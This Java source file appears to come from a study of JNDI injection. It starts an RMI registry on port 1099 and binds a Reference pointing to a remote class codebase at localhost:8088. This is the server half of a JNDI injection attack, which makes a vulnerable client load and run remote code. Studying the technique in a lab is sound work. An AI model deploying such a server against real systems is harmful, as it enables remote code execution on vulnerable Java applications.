package JNDI.Server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;


import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/11 15:40
 */
public class Server2 {
    public static void main(String[] args) throws Exception{
        String url = "http://localhost:8088";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Test","Test",url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj",referenceWrapper);
    }
}
